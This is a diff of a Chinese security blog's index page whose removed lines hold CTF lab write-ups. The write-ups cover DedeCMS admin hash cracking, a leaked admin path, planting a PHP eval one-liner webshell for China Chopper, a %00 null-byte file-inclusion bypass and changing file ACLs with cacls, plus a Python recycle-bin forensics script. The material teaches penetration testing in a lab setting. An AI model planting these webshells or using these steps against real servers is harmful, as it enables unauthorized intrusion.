-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/21.png" alt="21"></p>
-<p>再次点击 <strong>上传</strong> 后，发现 <strong>图片</strong> 一栏仍为空，需要<strong>手动填写图片马的绝对地址</strong>（这里真心想吐槽这个不合理的设计=_=!!!），填写完点击 <strong>保存</strong> 即可：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/22.png" alt="22"></p>
-<p>在 <strong>幻灯片管理</strong> 页面没显示图片马在服务器上的地址？点击 <strong>编辑</strong> 亦是如此：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/23.png" alt="23"></p>
-<p>这个点也是本题的一大坑，大家也许注意到了，既然 <strong>图片</strong> 一栏要手动填写地址，那前面还需要点击 <strong>上传</strong> 来选择图片马吗？其实这是为了用 Burp Suite 抓取数据包，获得图片马在服务器上的地址。</p>
-<p>如果刚刚忘记打开 Burp Suite，现在请打开，并设置好浏览器的局域网本地代理，严格按照上述的上传步骤重新将图片马上传。成功上传后，可在 <strong>Proxy -&gt; History</strong> 中点击相应记录，并在 <strong>Response -&gt; Raw</strong> 中看到图片马的地址为 <code>/uploadfile/image/20180309/201803090113470.jpg</code>：</p>
-<blockquote>
-<p>小贴士：在上传图片马的步骤中，在 <strong>Proxy -&gt; Intercept</strong> 中点击关闭截取功能，操作起来更加顺畅。当显示 <code>Intercept is off</code> 表示已关闭截取功能。</p>
-</blockquote>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/24.png" alt="24"></p>
-<p>由于 <code>/uploadfile/</code> 在网站根目录下，而根据漏洞说明中的源码，可知参数 <code>m</code>是在 <code>/system/function/global.inc.php</code> 文件中被引用，文件包含的关键语句如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include MOD_PATH.$m.&quot;/&quot;.$c.&quot;.php&quot;; //调用类</span><br></pre></td></tr></table></figure>
-<p>因此使用菜刀 <strong>添加SHELL</strong> 时，赋值给 <code>m</code> 的图片马路径需要先从 <code>MOD_PATH</code> 返回根目录，拟在前面添加 <code>../../</code>，猜测向上返回两级目录后可到达根目录，若猜测正确即能指向图片马的路径：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/25.png" alt="25"></p>
-<p>接下来尝试连接服务器，结果得到报错信息：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/26.png" alt="26"></p>
-<p>原因是参数 <code>m</code> 被引用到源码后，后面还连了一段字符串，该字符串默认情况下是 <code>/index.php</code>，在漏洞说明的源码中可得到验证。所以可在参数 <code>m</code> 末尾加入空字符 <code>%00</code>，对源码中的 <code>include</code> 语句进行截断。详情可参考：</p>
-<blockquote>
-<p><a href="http://www.jinglingshu.org/?p=1339" target="_blank" rel="noopener">文件上传之\00截断与文件包含之%00截断 文件包含漏洞详解</a></p>
-</blockquote>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/27.png" alt="27"></p>
-<p>如无意外，成功地连接上服务器，并在根目录下看到 flag 文件 <code>flag9szsed-fdzvc4-1l3iza.txt</code>：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/28.png" alt="28"></p>
-<p>打开 flag 文件即可获得 <code>key{7h7hii9a}</code>，大功告成，因此第 2 题答案就是 <code>7h7hii9a</code>：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/29.png" alt="29"></p>
-<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>获得 webshell 后，除了查看 flag 文件，还能查看所有后台文件的源码，包括上述的 MD5 哈希算法，以及在 <code>/system/common.inc.php</code> 与 <code>/system/function/global.inc.php</code> 中进一步验证了参数 <code>m</code> 的值是跟在 <code>/system/modules/</code> 后面的，所以，需要向上返回两级目录的猜测是正确的：</p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/30.png" alt="30"></p>
-<p><img src="/2018/10/15/web渗透测试入门之-你是会员吗/31.png" alt="31"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/15/web渗透测试入门之-你是会员吗/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-web渗透入门之-真的很简单" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/12/web渗透入门之-真的很简单/">web渗透入门之-真的很简单</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/12/web渗透入门之-真的很简单/" class="archive-article-date">
-  	<time datetime="2018-10-12T07:46:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="0x01-网站管理员的密码是多少？"><a href="#0x01-网站管理员的密码是多少？" class="headerlink" title="0x01 网站管理员的密码是多少？"></a>0x01 网站管理员的密码是多少？</h1><p>在实验环境内根据提示打开下载链接 <code>http://file.ichunqiu.com/49ba59ab</code>，接着下载爆破工具 <code>dedecms.exe</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/1.png" alt="dedecms_download"></p>
-<p>打开工具，输入目标 URL，一键爆破得到管理员的账号 <code>ichunqiu</code> 与密码哈希值 <code>adab29e084ff095ce3eb</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/2" alt="dedecms"></p>
-<p>仔细数数，发现密码哈希值是 20 位的（注：此处的“位”均为十六进制，而非二进制），上网一查才发现这是织梦 CMS 的特性，实现过程可参考 <a href="http://www.jb51.net/cms/104721.html" target="_blank" rel="noopener">DEDECMS的20位MD5加密密文解密示例介绍</a>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/3.png" alt="dedecms_md5"></p>
-<p>将 20 位的哈希值用 <a href="http://www.dmd5.com/md5-decrypter.jsp" target="_blank" rel="noopener">MD5解密工具</a> 解密，得到密码明文 <code>only_system</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/4.png" alt="password"></p>
-<p>为验证 20 位的 MD5 哈希算法规则，可进一步用 <a href="https://md5jiami.51240.com/" target="_blank" rel="noopener">MD5加密工具</a> 对 <code>only_system</code> 加密，发现其 16 位哈希值确实能由 20 位哈希值去掉前 3 位与后 1 位所得:</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/5.png" alt="password_verify"></p>
-<h1 id="0x02-网站后台目录名是什么？"><a href="#0x02-网站后台目录名是什么？" class="headerlink" title="0x02 网站后台目录名是什么？"></a>0x02 网站后台目录名是什么？</h1><p>第 2 题上来先尝试织梦 CMS 的默认后台路径 <code>/dede/index.php</code> 或 <code>/dede/login.php</code>，得到 404 的结果也是意料之中，即现在的问题是要找出修改后的后台目录名。</p>
-<p>打开实验工具箱，发现【目录扫描】文件夹，以【御剑后台扫描工具】为例，对目标 URL 扫描后得到如下结果：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/6.png" alt="directory_scan"></p>
-<p>注意，为了保证扫描效率，一般后台扫描工具都是采用字典扫描，而不是暴力穷举，因此<strong>不同扫描器得到的结果不完全相同，尽可能使用多种扫描器，偏僻怪异的名字可能扫描不出来</strong>。</p>
-<p>笔者采用了多种扫描器，并对其可能的结果进行验证，都一无所获，即可<strong>判断此后台目录名具有较强的个性或随机性</strong>。</p>
-<p>所以要转换思路，看看织梦 CMS 是否存在后台地址信息泄露的漏洞。果不其然，发现从报错文件 <code>/data/mysql_error_trace.inc</code> 或 <code>/data/mysqli_error_trace.inc</code> 中，可得到泄露的后台路径，具体可参考：</p>
-<blockquote>
-<p><a href="http://blog.csdn.net/wangyi_lin/article/details/9286937" target="_blank" rel="noopener">dedecms的各种卡哇伊小漏洞</a><br><a href="http://www.cnblogs.com/hookjoy/p/6996820.html" target="_blank" rel="noopener">dedecms(织梦)漏洞&amp;exp整理</a><br><a href="http://www.daixiaorui.com/read/14.html" target="_blank" rel="noopener">php学习之织梦dedecms漏洞讲解</a></p>
-</blockquote>
-<p>最后在 <code>/data/mysqli_error_trace.inc</code> 中获得后台目录名为 <code>lichunqiul</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/7.png" alt="mysqli_error_trace"></p>
-<p>对其进行验证，终于看到了后台登录页面：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/8.png" alt="login"></p>
-<h1 id="0x03-管理员桌面中-flag-文件信息是？"><a href="#0x03-管理员桌面中-flag-文件信息是？" class="headerlink" title="0x03 管理员桌面中 flag 文件信息是？"></a>0x03 管理员桌面中 flag 文件信息是？</h1><p>用账号 <code>ichunqiu</code> 与密码 <code>only_system</code> 登录后台后，根据实验手册，要想办法利用<a href="http://www.zhongguocaidao.com/" target="_blank" rel="noopener">中国菜刀</a>连接服务器，获得 webshell，进而查看 flag 文件中的信息。</p>
-<h2 id="获取-webshell"><a href="#获取-webshell" class="headerlink" title="获取 webshell"></a>获取 webshell</h2><p>首先我们需要在服务器插入<a href="https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC" target="_blank" rel="noopener">一句话木马</a>，然后才能用菜刀连接，获得 webshell。这里介绍两种插入一句话木马的方法。</p>
-<h3 id="直接修改模板-PHP-源码"><a href="#直接修改模板-PHP-源码" class="headerlink" title="直接修改模板 PHP 源码"></a>直接修改模板 PHP 源码</h3><p>依次点击 <strong>模板 -&gt; 标签源码管理</strong>，以编辑第一个模板 <code>adminname.lib.php</code> 为例：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/9.png" alt="template_list"></p>
-<p>在模板源码第一行插入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/10.png" alt="template_edit"></p>
-<p>接着在工具箱【webshell】文件夹打开【中国菜刀】：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/11.png" alt="chopper"></p>
-<p>在 <strong>添加SHELL</strong> 输入框中，输入被插入木马模板文件的地址 <code>http://www.test.ichunqiu/include/taglib/adminname.lib.php</code>，其右侧填入木马中接收 POST 请求数据的 key 字段 <code>cmd</code>，脚本类型为 <code>PHP(Eval)</code>，字符编码为 <code>GB2312</code>，设置完成后点击 <strong>添加</strong>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/12.png" alt="add_shell_1"></p>
-<p>若参数设置正确，双击所添加的条目，即可连接服务器的资源管理器，进入到模板文件所在的目录：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/13.png" alt="manager_1"></p>
-<h3 id="上传一句话木马文件"><a href="#上传一句话木马文件" class="headerlink" title="上传一句话木马文件"></a>上传一句话木马文件</h3><p>先在本地创建文件 <code>trojan.php</code>，写入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/14.png" alt="trojan_edit"></p>
-<p>再依次点击 <strong>系统 -&gt; 系统基本参数 -&gt; 附件设置</strong>，如下图更改允许上传的文件类型，否则木马将上传失败：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/15.png" alt="file_type"></p>
-<p>最后点击 <strong>核心 -&gt; 上传新文件</strong>，如下图所示上传木马：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/16.png" alt="trojan_upload"></p>
-<p>上传完毕后点击 <strong>核心 -&gt; 附件数据管理 -&gt; 更改</strong>，即可查看木马的路径：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/17.png" alt="trojan_path"></p>
-<p>接着利用菜刀添加SHELL，步骤同上，只不过地址更改为 <code>http://www.test.ichunqiu/uploads/soft/180307/1_1503138291.php</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/18.png" alt="add_shell_2"></p>
-<p>若参数设置正确，双击连接服务器的资源管理器，即可进入到木马所上传的目录：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/19.png" alt="manager_2"></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>进入到管理员桌面可看到 flag 文件 <code>flag~ichunqiu.txt</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/20.png" alt="manager_flag"></p>
-<p>但双击后未显示任何内容，估计是权限受限。接下来可右键点击条目，祭出虚拟终端，即 webshell 的命令行模式：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/21.png" alt="chopper_terminal"></p>
-<p>先切换至管理员桌面，用 <code>cacls</code> 命令查看 flag 文件的<a href="https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">访问控制列表（ACL）</a>，后用 <code>whoami</code> 命令查看用户名，发现 <code>authority\system</code> 用户对于 flag 文件的权限是 N，即无权限，用 <code>type</code> 命令查看 flag 文件果然是拒绝访问的：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/22.png" alt="deny"></p>
-<p>用 <code>cacls</code> 命令更改了访问权限后，<code>authority\system</code> 用户对于 flag 文件的权限变成了 F，即所有权限，再次查看 flag 文件内容即可看到 <code>key{il2o3l}</code>：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/23.png" alt="flag"></p>
-<p>注意提交答案的时候有个坑，记得先拆掉包装，只需提交 <code>il2o3l</code> 即可。最后附上 <code>cacls</code> 命令的用法：</p>
-<p><img src="/2018/10/12/web渗透入门之-真的很简单/24.png" alt="cacls"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/12/web渗透入门之-真的很简单/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-用python来恢复回收站中删除的项目" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/12/用python来恢复回收站中删除的项目/">用python来恢复回收站中删除的项目</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/12/用python来恢复回收站中删除的项目/" class="archive-article-date">
-  	<time datetime="2018-10-12T05:50:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="用python来恢复回收站中删除的项目"><a href="#用python来恢复回收站中删除的项目" class="headerlink" title="用python来恢复回收站中删除的项目"></a>用python来恢复回收站中删除的项目</h2><p>当用户通过windows explorer删除文件时，操作系统会将这个文件移动到特殊的文件夹中并标记这文件已删除，但并不是实际上的删除它们。</p>
-<p>在 Windows 98 和更早的系统中用的是 FAT 文件系统。C:\Recycled\目录保存着回 收站目录。</p>
-<p>支持 NTFS 的操作系统有 Windows NT，2000，和 XP 存储回收站在 C:\Recycler\目录下。</p>
-<p>Windows Vista 和 Windows 7 系统存储在 C:\$Recycle.Bin 目录下。</p>
-<h3 id="使用os模块查找已删除的项目"><a href="#使用os模块查找已删除的项目" class="headerlink" title="使用os模块查找已删除的项目"></a>使用os模块查找已删除的项目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">returnDir</span><span class="params">()</span>:</span></span><br><span class="line">    dirs= [<span class="string">'C:\\Recycler\\'</span>, <span class="string">'C:\\Recycled\\'</span>, <span class="string">'C:\\$Recycle.Bin\\'</span>]</span><br><span class="line">    <span class="keyword">for</span> recycleDir <span class="keyword">in</span> dirs:</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(recycleDir):</span><br><span class="line">            <span class="keyword">return</span> recycleDir</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br></pre></td></tr></table></figure>
-<p>在发现回收站目录之后，检查里面的内容，注意到两个子目录，都包含字符串 S-1-5-21-1275210071-1715567821-725345543-并终止与 1005 或 者 500。这个字符串用户的 SID，与机器上的用户的账户一一相对应。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\RECYCLER&gt;dir /a</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 882A-6E93</span><br><span class="line">Directory of C:\RECYCLER</span><br><span class="line">04/12/2011 09:24 AM &lt;DIR&gt; .</span><br><span class="line">04/12/2011 09:24 AM &lt;DIR&gt; ..</span><br><span class="line">04/12/2011 09:56 AM</span><br><span class="line">&lt;DIR&gt; S-1-5-21-1275210071-1715567821-</span><br><span class="line">725345543-</span><br><span class="line">1005</span><br><span class="line">04/12/2011 09:20 AM &lt;DIR&gt; S-1-5-21-1275210071-1715567821-</span><br><span class="line"> 725345543-</span><br><span class="line">500</span><br><span class="line"> 0 File(s) 0 bytes</span><br><span class="line"> 4 Dir(s) 30,700,670,976 bytes free</span><br></pre></td></tr></table></figure>
-<h3 id="用python将用户的SID关联起来"><a href="#用python将用户的SID关联起来" class="headerlink" title="用python将用户的SID关联起来"></a>用python将用户的SID关联起来</h3><p>使用 Windows 注册表将 SID 转化为一个准确的用户名。通过检查 Windows 注册表键值 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\\ProfileImagePath</code>，我们可以看到它返回 一个是<code>%SystemDrive%\Documents and Settings\&lt;USERID&gt;</code>。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//允许我们将 SID 为 S-1-5-21-1275210071-1715567821-725345543-1005 转化为用户名“alex”。</span><br><span class="line">C:\RECYCLER&gt;reg query</span><br><span class="line"><span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\Curre</span></span><br><span class="line"><span class="string">ntVersion\ProfileList\S-1-5-21-1275210071-1715567821-</span></span><br><span class="line"><span class="string">725345543-1005"</span> /v</span><br><span class="line">ProfileImagePath</span><br><span class="line">! REG.EXE VERSION 3.0</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows</span><br><span class="line">NT\CurrentVersion\ProfileList \S-1-5-21-1275210071-1715567821-</span><br><span class="line">725345543-1005 ProfileImagePath</span><br><span class="line">REG_EXPAND_SZ %SystemDrive%\Documents and Settings\alex</span><br></pre></td></tr></table></figure>
-<p>编写一个小的函数来将每一个 SID 转化为用户名。当我们恢复回收站中被删除的项目时这将使我们打印更多 有用的输出。这个函数将打开注册便检查 <code>ProfileImagePath</code>键值，找到其值并 从中找到用户名。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _winreg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">returnDir</span><span class="params">()</span>:</span></span><br><span class="line">    dirs = [<span class="string">'C:\\Recycler\\'</span>, <span class="string">'C:\\Recycled\\'</span>, <span class="string">'C:\\$Recycle.Bin\\'</span>]</span><br><span class="line">    <span class="keyword">for</span> recycleDir <span class="keyword">in</span> dirs:</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(recycleDir):</span><br><span class="line">            <span class="keyword">return</span> recycleDir</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sid2user</span><span class="params">(sid)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,</span><br><span class="line">                              <span class="string">"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\\"</span> + sid)</span><br><span class="line">        (value, type) = _winreg.QueryValue(key, <span class="string">'ProfileImagePath'</span>)</span><br><span class="line">        user = value.split(<span class="string">'\\'</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> sid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findRecycled</span><span class="params">(recycleDir)</span>:</span></span><br><span class="line">    dirList = os.listdir(recycleDir)</span><br><span class="line">    <span class="keyword">for</span> sid <span class="keyword">in</span> dirList:</span><br><span class="line">        files = os.listdir(recycleDir + sid)</span><br><span class="line">        user = sid2user(sid)</span><br><span class="line">        print(<span class="string">'\n[*]Listing Files For User:'</span> + str(user))</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            print(<span class="string">'[+]Found File:'</span> + str(file))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    recycledDir = returnDir()</span><br><span class="line">    findRecycled(recycledDir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/12/用python来恢复回收站中删除的项目/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
     </nav>
   
 
@@ -1643,7 +1574,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color3">Android</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1651,7 +1582,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Android</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1667,11 +1598,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">travel</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color2">travel</a>
               </li>
             
             <div class="clearfix"></div>
